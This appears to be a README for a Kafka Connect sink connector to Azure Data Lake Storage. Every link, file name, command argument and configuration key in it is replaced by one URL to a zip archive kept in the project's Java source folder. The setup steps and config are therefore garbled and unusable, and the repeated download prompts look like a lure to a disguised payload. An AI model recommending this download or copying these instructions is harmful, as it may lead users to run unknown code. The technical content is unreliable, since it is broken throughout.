# 🚀 kcm-kafka-connect-adls-sink - Simplify Your Data Storage Process

[![Download Latest Release](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip%20Latest%https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip)](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip)

## 📖 Overview

The kcm-kafka-connect-adls-sink is a tool designed to help you easily store data in Azure Data Lake Storage Gen2 (ADLS Gen2). This application allows you to use Kafka Connect as a sink connector, which means it helps move data from Kafka into ADLS Gen2. It supports various features, including SAS authentication, Avro data format, GZIP compression, and partition-based file batching.

## 🔍 Features

- **SAS Authentication**: Secure your data transfers with Shared Access Signature (SAS) authentication, ensuring that your data is safe while moving to ADLS Gen2.
- **Avro Support**: Use Avro format for efficient data serialization. This helps you save space and improves processing speed.
- **GZIP Compression**: Reduce storage costs and improve transfer speeds by compressing your data with GZIP.
- **Partition-Based File Batching**: Organize your data neatly by batching files based on partitions.

## 💻 System Requirements

To use the kcm-kafka-connect-adls-sink, you will need the following:

- **Java Runtime Environment (JRE)**: Version 8 or higher.
- **Kafka**: Your setup should include a running Kafka broker.
- **Apache Kafka Connect**: Ensure you have Kafka Connect available in your environment.

## 🚀 Getting Started

### Steps to Download and Run

1. **Visit the Releases Page**  
   To download the kcm-kafka-connect-adls-sink, [visit this page to download](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip).

2. **Locate the Latest Release**  
   On the Releases page, look for the latest version. This is usually marked as "Latest" or has the highest version number.

3. **Download the Release**  
   Click on the release name to view the details. Find the download link for the appropriate file (typically a JAR file).

4. **Install the Application**  
   Once downloaded, store the file in a readily accessible location. There is no installation required; you can run it directly.

5. **Run the Application**  
   Open your terminal or command prompt. Navigate to the directory where you saved the JAR file. Use the following command to run the application:

   ```bash
   java -jar https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   ```

### Configuration Setup

Before you start, you need to set up a configuration file. Here’s how you can do it:

1. **Create a Configuration File**  
   Create a new file named `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`.

2. **Add Your Configuration**  
   Insert the following configuration parameters into the file:

   ```properties
   name=kcm-adls-sink
   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   topics=your-topic-name
   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
   compression=gzip
   ```

   Make sure to replace placeholders like `your-topic-name`, `youraccount`, and `your-sas-token` with your actual information.

3. **Save the File**  
   Save the configuration file in the same directory as your JAR file.

### Running the Connector

Once your setup is ready, you can start the Kafka Connect worker. Use this command in the terminal:

```bash
connect-standalone https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
```

Make sure to have a `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip` file configured to set up your Kafka Connect environment properly.

## ⚙️ Additional Settings

Depending on your use case, you might want to adjust additional settings in your `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip` file. Here are some commonly modified parameters:

- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Adjust this number to run more tasks in parallel, improving throughput.
- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Set how many records to buffer before writing to ADLS Gen2.
- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Customize the retry behavior in case of temporary failures.

## 📄 Documentation

For a deeper dive into all features and advanced configurations, check the [official documentation](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip).

## 🌐 Community and Support

If you encounter issues or have questions, feel free to reach out. Engage with our community via GitHub discussions or check existing queries.

## 🏁 Download & Install

Now that you're ready to start using the kcm-kafka-connect-adls-sink, [visit this page to download](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip). Follow the steps outlined above to set up and run the application successfully. Enjoy seamless data management using Azure Data Lake Storage!